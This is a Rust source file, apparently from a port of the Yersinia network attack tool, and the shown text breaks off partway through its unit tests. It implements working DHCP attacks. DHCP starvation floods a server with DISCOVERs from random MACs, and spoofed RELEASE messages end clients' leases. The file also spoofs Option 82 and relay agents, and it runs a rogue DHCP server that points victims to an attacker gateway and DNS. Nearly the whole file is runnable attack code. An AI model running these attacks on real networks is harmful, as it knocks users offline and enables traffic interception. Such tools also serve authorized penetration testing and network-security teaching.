//! DHCP Attack implementations
//!
//! This module implements DHCP attacks:
//! - Starvation (DHCP Exhaustion) - exhausts DHCP server IP pool
//! - Release Spoofing - spoofs DHCP RELEASE messages to release client leases

use super::packet::{DhcpMessageType, DhcpOption, DhcpPacket, DHCP_BROADCAST_FLAG};
use super::protocol::MacAddr;
use async_trait::async_trait;
use rand::Rng;
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::time::sleep;
use yersinia_core::{Attack, AttackContext, AttackStats as CoreAttackStats, Interface, Result};

/// Helper function to build UDP/IP/Ethernet frame for DHCP
fn build_dhcp_frame(
    src_mac: [u8; 6],
    dst_mac: [u8; 6],
    src_ip: Ipv4Addr,
    dst_ip: Ipv4Addr,
    src_port: u16,
    dst_port: u16,
    dhcp_payload: &[u8],
) -> Vec<u8> {
    let udp_len = (8 + dhcp_payload.len()) as u16;
    let ip_len = 20 + udp_len;
    let total_len = 14 + ip_len as usize;

    let mut frame = Vec::with_capacity(total_len);

    // Ethernet header (14 bytes)
    frame.extend_from_slice(&dst_mac);
    frame.extend_from_slice(&src_mac);
    frame.extend_from_slice(&[0x08, 0x00]); // EtherType: IPv4

    // IPv4 header (20 bytes - no options)
    frame.push(0x45); // Version 4, IHL 5 (20 bytes)
    frame.push(0x00); // DSCP/ECN
    frame.extend_from_slice(&ip_len.to_be_bytes()); // Total length
    frame.extend_from_slice(&[0x00, 0x00]); // Identification
    frame.extend_from_slice(&[0x00, 0x00]); // Flags & Fragment offset
    frame.push(64); // TTL
    frame.push(17); // Protocol: UDP
    frame.extend_from_slice(&[0x00, 0x00]); // Checksum (will calculate)
    frame.extend_from_slice(&src_ip.octets());
    frame.extend_from_slice(&dst_ip.octets());

    // Calculate IP checksum
    let ip_checksum = calculate_checksum(&frame[14..34]);
    frame[24] = (ip_checksum >> 8) as u8;
    frame[25] = (ip_checksum & 0xff) as u8;

    // UDP header (8 bytes)
    frame.extend_from_slice(&src_port.to_be_bytes());
    frame.extend_from_slice(&dst_port.to_be_bytes());
    frame.extend_from_slice(&udp_len.to_be_bytes());
    frame.extend_from_slice(&[0x00, 0x00]); // Checksum (optional for IPv4, set to 0)

    // DHCP payload
    frame.extend_from_slice(dhcp_payload);

    frame
}

/// Calculate Internet checksum (RFC 1071)
fn calculate_checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;

    // Sum 16-bit words
    while i < data.len() - 1 {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }

    // Add remaining byte if odd length
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }

    // Fold 32-bit sum to 16 bits
    while sum >> 16 != 0 {
        sum = (sum & 0xffff) + (sum >> 16);
    }

    !sum as u16
}

/// Helper to send DHCP packet
async fn send_dhcp_packet(
    interface: &Interface,
    src_mac: [u8; 6],
    dhcp_packet: &DhcpPacket,
) -> Result<()> {
    let dst_mac = [0xff; 6]; // Broadcast
    let src_ip = Ipv4Addr::new(0, 0, 0, 0); // 0.0.0.0 for DHCP client
    let dst_ip = Ipv4Addr::new(255, 255, 255, 255); // Broadcast
    let src_port = 68; // DHCP client port
    let dst_port = 67; // DHCP server port

    let dhcp_payload = dhcp_packet.build();
    let frame = build_dhcp_frame(
        src_mac,
        dst_mac,
        src_ip,
        dst_ip,
        src_port,
        dst_port,
        &dhcp_payload,
    );

    interface.send_raw(&frame)
}

/// DHCP Starvation Attack (Pool Exhaustion)
///
/// This attack sends DHCP DISCOVER messages with random MAC addresses
/// to exhaust the DHCP server's IP address pool. Each DISCOVER uses a
/// different MAC address, causing the server to allocate a new IP.
///
/// # Attack Flow
/// 1. Generate random MAC address
/// 2. Send DHCP DISCOVER with that MAC
/// 3. Repeat at specified rate until pool is exhausted
///
/// # References
/// - Yersinia C code: dhcp_th_dos_send_discover()
#[derive(Debug, Clone)]
pub struct DhcpStarvationAttack {
    /// Packets per second rate
    pub rate_pps: u32,
    /// Target specific DHCP server (None = broadcast to all)
    pub target_server: Option<Ipv4Addr>,
    /// Use random MAC for each request (recommended for starvation)
    pub use_random_mac: bool,
    /// Use random transaction ID for each request
    pub use_random_xid: bool,
    /// Duration to run attack (None = run indefinitely)
    pub duration_secs: Option<u64>,
}

impl DhcpStarvationAttack {
    /// Create a new DHCP Starvation attack with default settings
    pub fn new() -> Self {
        Self {
            rate_pps: 100,
            target_server: None,
            use_random_mac: true,
            use_random_xid: true,
            duration_secs: None,
        }
    }

    /// Set the packet rate (packets per second)
    pub fn with_rate(mut self, rate_pps: u32) -> Self {
        self.rate_pps = rate_pps;
        self
    }

    /// Set target server IP (None for broadcast)
    pub fn with_target_server(mut self, server: Option<Ipv4Addr>) -> Self {
        self.target_server = server;
        self
    }

    /// Set whether to use random MACs
    pub fn with_random_mac(mut self, use_random: bool) -> Self {
        self.use_random_mac = use_random;
        self
    }

    /// Set whether to use random transaction IDs
    pub fn with_random_xid(mut self, use_random: bool) -> Self {
        self.use_random_xid = use_random;
        self
    }

    /// Set attack duration in seconds
    pub fn with_duration(mut self, duration_secs: u64) -> Self {
        self.duration_secs = Some(duration_secs);
        self
    }

    /// Generate a random MAC address
    fn generate_random_mac() -> MacAddr {
        let mut rng = rand::thread_rng();
        let mut mac = [0u8; 6];
        rng.fill(&mut mac);
        // Ensure it's a unicast address (clear multicast bit)
        mac[0] &= 0xFE;
        // Set locally administered bit
        mac[0] |= 0x02;
        mac
    }

    /// Generate a random transaction ID
    fn generate_random_xid() -> u32 {
        rand::thread_rng().gen()
    }

    /// Generate DHCP DISCOVER packets for starvation
    pub fn generate_packets(&self, count: usize) -> Vec<DhcpPacket> {
        let mut packets = Vec::with_capacity(count);

        for _ in 0..count {
            let mac = if self.use_random_mac {
                Self::generate_random_mac()
            } else {
                [0x00, 0x11, 0x22, 0x33, 0x44, 0x55]
            };

            let xid = if self.use_random_xid {
                Self::generate_random_xid()
            } else {
                0x12345678
            };

            let packet = DhcpPacket::new_discover(xid, mac);
            packets.push(packet);
        }

        packets
    }

    /// Execute the attack
    ///
    /// Returns statistics about the attack execution:
    /// - packets_sent: total DISCOVER packets sent
    /// - duration: actual attack duration
    pub fn run<F>(&self, mut send_fn: F) -> AttackStats
    where
        F: FnMut(&DhcpPacket) -> std::result::Result<(), String>,
    {
        let start_time = Instant::now();
        let mut packets_sent = 0u64;
        let mut errors = 0u64;

        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);
        let end_time = self
            .duration_secs
            .map(|d| start_time + Duration::from_secs(d));

        loop {
            let iteration_start = Instant::now();

            // Check if we should stop
            if let Some(end) = end_time {
                if Instant::now() >= end {
                    break;
                }
            }

            // Generate and send packet
            let mac = if self.use_random_mac {
                Self::generate_random_mac()
            } else {
                [0x00, 0x11, 0x22, 0x33, 0x44, 0x55]
            };

            let xid = if self.use_random_xid {
                Self::generate_random_xid()
            } else {
                0x12345678
            };

            let packet = DhcpPacket::new_discover(xid, mac);

            match send_fn(&packet) {
                Ok(_) => packets_sent += 1,
                Err(_) => errors += 1,
            }

            // Rate limiting
            let elapsed = iteration_start.elapsed();
            if elapsed < interval {
                std::thread::sleep(interval - elapsed);
            }
        }

        AttackStats {
            packets_sent,
            errors,
            duration: start_time.elapsed(),
        }
    }

    /// Execute attack in a controlled manner with a stop signal
    pub fn run_with_stop<F>(&self, mut send_fn: F, stop_signal: Arc<AtomicBool>) -> AttackStats
    where
        F: FnMut(&DhcpPacket) -> std::result::Result<(), String>,
    {
        let start_time = Instant::now();
        let packets_sent = Arc::new(AtomicU64::new(0));
        let errors = Arc::new(AtomicU64::new(0));

        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);
        let end_time = self
            .duration_secs
            .map(|d| start_time + Duration::from_secs(d));

        while !stop_signal.load(Ordering::Relaxed) {
            let iteration_start = Instant::now();

            // Check if duration exceeded
            if let Some(end) = end_time {
                if Instant::now() >= end {
                    break;
                }
            }

            // Generate and send packet
            let mac = if self.use_random_mac {
                Self::generate_random_mac()
            } else {
                [0x00, 0x11, 0x22, 0x33, 0x44, 0x55]
            };

            let xid = if self.use_random_xid {
                Self::generate_random_xid()
            } else {
                0x12345678
            };

            let packet = DhcpPacket::new_discover(xid, mac);

            match send_fn(&packet) {
                Ok(_) => {
                    packets_sent.fetch_add(1, Ordering::Relaxed);
                }
                Err(_) => {
                    errors.fetch_add(1, Ordering::Relaxed);
                }
            }

            // Rate limiting
            let elapsed = iteration_start.elapsed();
            if elapsed < interval {
                std::thread::sleep(interval - elapsed);
            }
        }

        AttackStats {
            packets_sent: packets_sent.load(Ordering::Relaxed),
            errors: errors.load(Ordering::Relaxed),
            duration: start_time.elapsed(),
        }
    }
}

impl Default for DhcpStarvationAttack {
    fn default() -> Self {
        Self::new()
    }
}

/// DHCP Release Spoofing Attack
///
/// This attack sends spoofed DHCP RELEASE messages to force clients
/// to release their IP addresses. Can target specific clients or
/// generate random releases.
///
/// # Attack Flow
/// 1. Send DHCP RELEASE with spoofed client MAC and IP
/// 2. Server releases the IP address
/// 3. Client loses connectivity until it renews
///
/// # References
/// - Yersinia C code: dhcp_th_dos_send_release()
#[derive(Debug, Clone)]
pub struct DhcpReleaseAttack {
    /// Target specific client MAC (None = random)
    pub target_mac: Option<MacAddr>,
    /// Target specific IP to release (None = random from subnet)
    pub target_ip: Option<Ipv4Addr>,
    /// DHCP server IP address
    pub server_ip: Ipv4Addr,
    /// DHCP server MAC address
    pub server_mac: MacAddr,
    /// Generate random releases if no target specified
    pub randomize: bool,
    /// IP range start for random releases
    pub ip_range_start: Option<Ipv4Addr>,
    /// IP range end for random releases
    pub ip_range_end: Option<Ipv4Addr>,
    /// Rate of releases per second
    pub rate_pps: u32,
}

impl DhcpReleaseAttack {
    /// Create a new DHCP Release attack
    pub fn new(server_ip: Ipv4Addr, server_mac: MacAddr) -> Self {
        Self {
            target_mac: None,
            target_ip: None,
            server_ip,
            server_mac,
            randomize: false,
            ip_range_start: None,
            ip_range_end: None,
            rate_pps: 10,
        }
    }

    /// Set specific target MAC address
    pub fn with_target_mac(mut self, mac: MacAddr) -> Self {
        self.target_mac = Some(mac);
        self
    }

    /// Set specific target IP address
    pub fn with_target_ip(mut self, ip: Ipv4Addr) -> Self {
        self.target_ip = Some(ip);
        self
    }

    /// Enable random IP/MAC generation
    pub fn with_randomize(mut self, randomize: bool) -> Self {
        self.randomize = randomize;
        self
    }

    /// Set IP range for random releases
    pub fn with_ip_range(mut self, start: Ipv4Addr, end: Ipv4Addr) -> Self {
        self.ip_range_start = Some(start);
        self.ip_range_end = Some(end);
        self
    }

    /// Set release rate (packets per second)
    pub fn with_rate(mut self, rate_pps: u32) -> Self {
        self.rate_pps = rate_pps;
        self
    }

    /// Generate a random IP in the specified range
    fn generate_random_ip(&self) -> Ipv4Addr {
        if let (Some(start), Some(end)) = (self.ip_range_start, self.ip_range_end) {
            let start_u32 = u32::from(start);
            let end_u32 = u32::from(end);
            let range = end_u32 - start_u32;
            let offset = rand::thread_rng().gen_range(0..=range);
            Ipv4Addr::from(start_u32 + offset)
        } else {
            // Default to 192.168.1.0/24 range
            Ipv4Addr::new(192, 168, 1, rand::thread_rng().gen_range(2..254))
        }
    }

    /// Generate a random MAC address
    fn generate_random_mac() -> MacAddr {
        let mut rng = rand::thread_rng();
        let mut mac = [0u8; 6];
        rng.fill(&mut mac);
        mac[0] &= 0xFE; // Unicast
        mac[0] |= 0x02; // Locally administered
        mac
    }

    /// Generate DHCP RELEASE packet
    pub fn generate_release_packet(&self) -> DhcpPacket {
        let client_mac = self.target_mac.unwrap_or_else(Self::generate_random_mac);
        let client_ip = self.target_ip.unwrap_or_else(|| self.generate_random_ip());
        let xid = rand::thread_rng().gen();

        DhcpPacket::new_release(xid, client_mac, client_ip, self.server_ip)
    }

    /// Generate multiple RELEASE packets
    pub fn generate_packets(&self, count: usize) -> Vec<DhcpPacket> {
        (0..count).map(|_| self.generate_release_packet()).collect()
    }

    /// Execute the attack for a specific IP range
    ///
    /// Sends RELEASE for each IP in the range [start..=end]
    pub fn run_range<F>(&self, start_ip: Ipv4Addr, end_ip: Ipv4Addr, mut send_fn: F) -> AttackStats
    where
        F: FnMut(&DhcpPacket) -> std::result::Result<(), String>,
    {
        let start_time = Instant::now();
        let mut packets_sent = 0u64;
        let mut errors = 0u64;

        let start_u32 = u32::from(start_ip);
        let end_u32 = u32::from(end_ip);

        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);

        for ip_u32 in start_u32..=end_u32 {
            let iteration_start = Instant::now();

            let client_ip = Ipv4Addr::from(ip_u32);
            let client_mac = if self.randomize {
                Self::generate_random_mac()
            } else {
                // Use a deterministic MAC based on IP
                let octets = client_ip.octets();
                [0x00, 0x11, octets[0], octets[1], octets[2], octets[3]]
            };

            let xid = rand::thread_rng().gen();
            let packet = DhcpPacket::new_release(xid, client_mac, client_ip, self.server_ip);

            match send_fn(&packet) {
                Ok(_) => packets_sent += 1,
                Err(_) => errors += 1,
            }

            // Rate limiting
            let elapsed = iteration_start.elapsed();
            if elapsed < interval {
                std::thread::sleep(interval - elapsed);
            }
        }

        AttackStats {
            packets_sent,
            errors,
            duration: start_time.elapsed(),
        }
    }

    /// Execute continuous random releases
    pub fn run_continuous<F>(&self, mut send_fn: F, duration: Duration) -> AttackStats
    where
        F: FnMut(&DhcpPacket) -> std::result::Result<(), String>,
    {
        let start_time = Instant::now();
        let mut packets_sent = 0u64;
        let mut errors = 0u64;

        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);
        let end_time = start_time + duration;

        while Instant::now() < end_time {
            let iteration_start = Instant::now();

            let packet = self.generate_release_packet();

            match send_fn(&packet) {
                Ok(_) => packets_sent += 1,
                Err(_) => errors += 1,
            }

            // Rate limiting
            let elapsed = iteration_start.elapsed();
            if elapsed < interval {
                std::thread::sleep(interval - elapsed);
            }
        }

        AttackStats {
            packets_sent,
            errors,
            duration: start_time.elapsed(),
        }
    }
}

/// Attack execution statistics
#[derive(Debug, Clone)]
pub struct AttackStats {
    pub packets_sent: u64,
    pub errors: u64,
    pub duration: Duration,
}

impl AttackStats {
    /// Get average packets per second
    pub fn pps(&self) -> f64 {
        if self.duration.as_secs_f64() > 0.0 {
            self.packets_sent as f64 / self.duration.as_secs_f64()
        } else {
            0.0
        }
    }

    /// Get success rate (0.0 to 1.0)
    pub fn success_rate(&self) -> f64 {
        let total = self.packets_sent + self.errors;
        if total > 0 {
            self.packets_sent as f64 / total as f64
        } else {
            0.0
        }
    }
}

/// DHCP Option 82 Manipulation Attack
///
/// Manipulates DHCP Relay Agent Information Option (Option 82) to bypass
/// network access controls or inject malicious relay information.
#[derive(Debug, Clone)]
pub struct DhcpOption82Attack {
    pub circuit_id: Vec<u8>,
    pub remote_id: Vec<u8>,
    pub relay_agent_ip: Ipv4Addr,
}

impl DhcpOption82Attack {
    pub fn new(circuit_id: Vec<u8>, remote_id: Vec<u8>, relay_ip: Ipv4Addr) -> Self {
        Self {
            circuit_id,
            remote_id,
            relay_agent_ip: relay_ip,
        }
    }

    pub fn build_discover_with_option82(&self) -> Vec<u8> {
        // Build DHCP DISCOVER with Option 82
        let mut packet = vec![];
        // Option 82: Relay Agent Information
        packet.push(82); // Option code
        let option_len = 2 + 2 + self.circuit_id.len() + self.remote_id.len();
        packet.push(option_len as u8);

        // Sub-option 1: Circuit ID
        packet.push(1);
        packet.push(self.circuit_id.len() as u8);
        packet.extend_from_slice(&self.circuit_id);

        // Sub-option 2: Remote ID
        packet.push(2);
        packet.push(self.remote_id.len() as u8);
        packet.extend_from_slice(&self.remote_id);

        packet
    }
}

/// DHCP Relay Manipulation Attack
///
/// Spoofs DHCP relay agents to manipulate DHCP traffic routing
/// and potentially intercept or redirect DHCP communications.
#[derive(Debug, Clone)]
pub struct DhcpRelayManipulationAttack {
    pub fake_relay_ip: Ipv4Addr,
    pub target_server: Ipv4Addr,
    pub gateway_ip: Ipv4Addr,
    pub hop_count: u8,
}

impl DhcpRelayManipulationAttack {
    pub fn new(relay_ip: Ipv4Addr, server_ip: Ipv4Addr) -> Self {
        Self {
            fake_relay_ip: relay_ip,
            target_server: server_ip,
            gateway_ip: relay_ip,
            hop_count: 1,
        }
    }

    pub fn with_hops(mut self, hops: u8) -> Self {
        self.hop_count = hops;
        self
    }

    pub fn build_relayed_discover(&self, client_mac: MacAddr) -> Vec<u8> {
        // Build DHCP packet with relay agent IP (giaddr) set
        let mut packet = vec![0u8; 300];
        packet[0] = 1; // BOOTREQUEST
        packet[1] = 1; // Hardware type: Ethernet
        packet[2] = 6; // Hardware address length
        packet[3] = self.hop_count; // Hop count

        // Set giaddr (relay agent IP)
        let giaddr_offset = 24;
        packet[giaddr_offset..giaddr_offset + 4].copy_from_slice(&self.fake_relay_ip.octets());

        // Set client MAC
        packet[28..34].copy_from_slice(&client_mac);

        packet
    }
}

/// Rogue DHCP Server Persistence Attack
///
/// Maintains a persistent rogue DHCP server that responds faster than
/// legitimate servers, allowing continuous network compromise.
#[derive(Debug, Clone)]
pub struct RogueDhcpServerAttack {
    pub rogue_server_ip: Ipv4Addr,
    pub offered_gateway: Ipv4Addr,
    pub offered_dns: Vec<Ipv4Addr>,
    pub lease_time: u32,
    pub response_delay_ms: u64,
}

impl RogueDhcpServerAttack {
    pub fn new(server_ip: Ipv4Addr, gateway: Ipv4Addr) -> Self {
        Self {
            rogue_server_ip: server_ip,
            offered_gateway: gateway,
            offered_dns: vec![server_ip], // Use rogue server as DNS
            lease_time: 3600,             // 1 hour
            response_delay_ms: 0,         // Respond immediately to beat legitimate server
        }
    }

    pub fn with_dns(mut self, dns_servers: Vec<Ipv4Addr>) -> Self {
        self.offered_dns = dns_servers;
        self
    }

    pub fn with_lease_time(mut self, seconds: u32) -> Self {
        self.lease_time = seconds;
        self
    }

    pub fn build_offer_response(
        &self,
        client_mac: MacAddr,
        offered_ip: Ipv4Addr,
        xid: u32,
    ) -> Vec<u8> {
        let mut packet = vec![0u8; 300];
        packet[0] = 2; // BOOTREPLY
        packet[1] = 1; // Hardware type
        packet[2] = 6; // Hardware address length
        packet[3] = 0; // Hops

        // Transaction ID
        packet[4..8].copy_from_slice(&xid.to_be_bytes());

        // Your IP (offered to client)
        packet[16..20].copy_from_slice(&offered_ip.octets());

        // Server IP
        packet[20..24].copy_from_slice(&self.rogue_server_ip.octets());

        // Client MAC
        packet[28..34].copy_from_slice(&client_mac);

        // DHCP magic cookie
        packet[236..240].copy_from_slice(&[99, 130, 83, 99]);

        // Options
        let mut offset = 240;

        // Option 53: DHCP Message Type = OFFER (2)
        packet[offset] = 53;
        packet[offset + 1] = 1;
        packet[offset + 2] = 2;
        offset += 3;

        // Option 54: Server Identifier
        packet[offset] = 54;
        packet[offset + 1] = 4;
        packet[offset + 2..offset + 6].copy_from_slice(&self.rogue_server_ip.octets());
        offset += 6;

        // Option 51: Lease Time
        packet[offset] = 51;
        packet[offset + 1] = 4;
        packet[offset + 2..offset + 6].copy_from_slice(&self.lease_time.to_be_bytes());
        offset += 6;

        // Option 3: Router (Gateway)
        packet[offset] = 3;
        packet[offset + 1] = 4;
        packet[offset + 2..offset + 6].copy_from_slice(&self.offered_gateway.octets());
        offset += 6;

        // Option 6: DNS Servers
        if !self.offered_dns.is_empty() {
            packet[offset] = 6;
            packet[offset + 1] = (self.offered_dns.len() * 4) as u8;
            offset += 2;
            for dns in &self.offered_dns {
                packet[offset..offset + 4].copy_from_slice(&dns.octets());
                offset += 4;
            }
        }

        // Option 255: End
        packet[offset] = 255;

        packet
    }
}

// =============================================================================
// Attack trait implementations
// =============================================================================

#[async_trait]
impl Attack for DhcpStarvationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);
        let start_time = Instant::now();
        let end_time = self
            .duration_secs
            .map(|d| start_time + Duration::from_secs(d));

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                // Generate random MAC and XID
                let mac = if self.use_random_mac {
                    Self::generate_random_mac()
                } else {
                    [0x00, 0x11, 0x22, 0x33, 0x44, 0x55]
                };

                let xid = if self.use_random_xid {
                    Self::generate_random_xid()
                } else {
                    0x12345678
                };

                let packet = DhcpPacket::new_discover(xid, mac);

                // Send packet via interface
                if let Err(_e) = send_dhcp_packet(&ctx.interface, mac, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            // Check duration
            if let Some(end) = end_time {
                if Instant::now() >= end {
                    break;
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {
        // Pausing is handled by ctx.paused flag
    }

    fn resume(&self) {
        // Resuming is handled by ctx.paused flag
    }

    fn stop(&self) {
        // Stopping is handled by ctx.running flag
    }

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "DHCP Starvation"
    }
}

#[async_trait]
impl Attack for DhcpReleaseAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps as u64);

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                let client_mac = self.target_mac.unwrap_or_else(Self::generate_random_mac);
                let client_ip = self.target_ip.unwrap_or_else(|| self.generate_random_ip());
                let xid = rand::thread_rng().gen();
                let packet = DhcpPacket::new_release(xid, client_mac, client_ip, self.server_ip);

                // Send packet via interface
                if let Err(_e) = send_dhcp_packet(&ctx.interface, client_mac, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "DHCP Release Spoofing"
    }
}

#[async_trait]
impl Attack for DhcpOption82Attack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(5);
        let client_mac = [0x00, 0x0c, 0x29, 0xaa, 0xbb, 0xcc];

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                let xid: u32 = rand::thread_rng().gen();

                // Build DHCP DISCOVER with Option 82
                let mut packet = DhcpPacket::new_discover(xid, client_mac);

                // Set giaddr to relay agent IP to simulate relayed packet
                packet.giaddr = self.relay_agent_ip;
                packet.hops = 1;

                // Add Option 82 (Relay Agent Information) manually to options
                // We need to build it as raw bytes since DhcpOption doesn't have RelayAgentInfo variant
                let mut option82_data = Vec::new();

                // Sub-option 1: Circuit ID
                option82_data.push(1);
                option82_data.push(self.circuit_id.len() as u8);
                option82_data.extend_from_slice(&self.circuit_id);

                // Sub-option 2: Remote ID
                option82_data.push(2);
                option82_data.push(self.remote_id.len() as u8);
                option82_data.extend_from_slice(&self.remote_id);

                // Insert Option 82 before the End option
                let end_pos = packet
                    .options
                    .iter()
                    .position(|opt| matches!(opt, DhcpOption::End));
                if let Some(pos) = end_pos {
                    packet
                        .options
                        .insert(pos, DhcpOption::Unknown(82, option82_data));
                }

                // Send packet
                if let Err(_e) = send_dhcp_packet(&ctx.interface, client_mac, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "DHCP Option 82 Manipulation"
    }
}

#[async_trait]
impl Attack for DhcpRelayManipulationAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_secs(10);
        let client_mac = [0x00, 0x11, 0x22, 0x33, 0x44, 0x55];

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                let xid: u32 = rand::thread_rng().gen();

                // Build DHCP DISCOVER packet that appears to be relayed
                let mut packet = DhcpPacket::new_discover(xid, client_mac);

                // Set relay agent information
                packet.giaddr = self.fake_relay_ip; // Gateway IP address (relay agent)
                packet.hops = self.hop_count;

                // Add Option 54 (Server Identifier) to direct towards specific server
                let end_pos = packet
                    .options
                    .iter()
                    .position(|opt| matches!(opt, DhcpOption::End));
                if let Some(pos) = end_pos {
                    packet
                        .options
                        .insert(pos, DhcpOption::ServerId(self.target_server));
                }

                // Send relayed packet (still broadcast, but with giaddr set)
                if let Err(_e) = send_dhcp_packet(&ctx.interface, client_mac, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "DHCP Relay Manipulation"
    }
}

#[async_trait]
impl Attack for RogueDhcpServerAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        // Rogue server sends unsolicited DHCP OFFERs to poison the network
        // In a full implementation, this would listen for DISCOVER and respond
        // For now, we send periodic gratuitous OFFERs
        let interval = Duration::from_secs(30);
        let mut ip_counter = 100u8; // Start offering from .100

        while ctx.running.load(Ordering::Relaxed) {
            if !ctx.paused.load(Ordering::Relaxed) {
                // Generate a fake client MAC to offer IP to
                let (rand1, rand2, rand3, xid) = {
                    let mut rng = rand::thread_rng();
                    (
                        rng.gen::<u8>(),
                        rng.gen::<u8>(),
                        rng.gen::<u8>(),
                        rng.gen::<u32>(),
                    )
                };

                let client_mac = [0x00, 0x50, 0x56, rand1, rand2, rand3];

                // Calculate offered IP (cycle through range)
                let offered_ip = Ipv4Addr::new(
                    self.rogue_server_ip.octets()[0],
                    self.rogue_server_ip.octets()[1],
                    self.rogue_server_ip.octets()[2],
                    ip_counter,
                );

                ip_counter = if ip_counter >= 200 {
                    100
                } else {
                    ip_counter + 1
                };

                // Build DHCP OFFER packet
                let mut packet = DhcpPacket::new();
                packet.op = 2; // BOOTREPLY
                packet.xid = xid;
                packet.yiaddr = offered_ip; // Your IP address (offered)
                packet.siaddr = self.rogue_server_ip; // Server IP
                packet.chaddr[..6].copy_from_slice(&client_mac);
                packet.flags = DHCP_BROADCAST_FLAG;

                // Build options
                packet.options = vec![
                    DhcpOption::MessageType(DhcpMessageType::Offer),
                    DhcpOption::ServerId(self.rogue_server_ip),
                    DhcpOption::LeaseTime(self.lease_time),
                    DhcpOption::Router(vec![self.offered_gateway]),
                ];

                // Add DNS servers if configured
                if !self.offered_dns.is_empty() {
                    packet
                        .options
                        .push(DhcpOption::DnsServer(self.offered_dns.clone()));
                }

                packet.options.push(DhcpOption::End);

                // Send rogue OFFER from server MAC
                let server_mac = ctx.interface.mac_address.octets();
                if let Err(_e) = send_dhcp_packet(&ctx.interface, server_mac, &packet).await {
                    // Silently continue on error
                } else {
                    ctx.stats.packets_sent.fetch_add(1, Ordering::Relaxed);
                }
            }

            sleep(interval).await;
        }

        Ok(())
    }

    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}

    fn stats(&self) -> CoreAttackStats {
        CoreAttackStats::default()
    }

    fn name(&self) -> &str {
        "Rogue DHCP Server"
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_starvation_attack_new() {
        let attack = DhcpStarvationAttack::new();
        assert_eq!(attack.rate_pps, 100);
        assert!(attack.use_random_mac);
        assert!(attack.use_random_xid);
        assert_eq!(attack.target_server, None);
    }

    #[test]
    fn test_starvation_attack_builder() {
        let attack = DhcpStarvationAttack::new()
            .with_rate(50)
            .with_random_mac(false)
            .with_duration(60);

        assert_eq!(attack.rate_pps, 50);
        assert!(!attack.use_random_mac);
        assert_eq!(attack.duration_secs, Some(60));
    }

    #[test]
    fn test_starvation_generate_random_mac() {
        let mac1 = DhcpStarvationAttack::generate_random_mac();
        let mac2 = DhcpStarvationAttack::generate_random_mac();

        // Should be different (extremely unlikely to be same)
        assert_ne!(mac1, mac2);

        // Should be unicast (bit 0 of first octet clear)
        assert_eq!(mac1[0] & 0x01, 0);

        // Should be locally administered (bit 1 of first octet set)
        assert_eq!(mac1[0] & 0x02, 0x02);
    }

    #[test]
    fn test_starvation_generate_packets() {
        let attack = DhcpStarvationAttack::new();
        let packets = attack.generate_packets(10);

        assert_eq!(packets.len(), 10);

        for packet in &packets {
            assert_eq!(packet.op, 1); // BOOTREQUEST
            assert_eq!(packet.message_type(), Some(DhcpMessageType::Discover));
            assert_eq!(packet.flags, DHCP_BROADCAST_FLAG);
        }
    }

    #[test]
    fn test_starvation_generate_packets_fixed_mac() {
        let attack = DhcpStarvationAttack::new().with_random_mac(false);
        let packets = attack.generate_packets(5);

        // All packets should have same MAC when random_mac is false
        let first_mac = packets[0].client_mac();
        for packet in &packets {
            assert_eq!(packet.client_mac(), first_mac);
        }
    }

    #[test]
    fn test_release_attack_new() {
        let server_ip = Ipv4Addr::new(192, 168, 1, 1);
        let server_mac = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];

        let attack = DhcpReleaseAttack::new(server_ip, server_mac);

        assert_eq!(attack.server_ip, server_ip);
        assert_eq!(attack.server_mac, server_mac);
        assert_eq!(attack.target_mac, None);
        assert_eq!(attack.target_ip, None);
    }

    #[test]
    fn test_release_attack_builder() {
        let server_ip = Ipv4Addr::new(192, 168, 1, 1);
        let server_mac = [0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF];
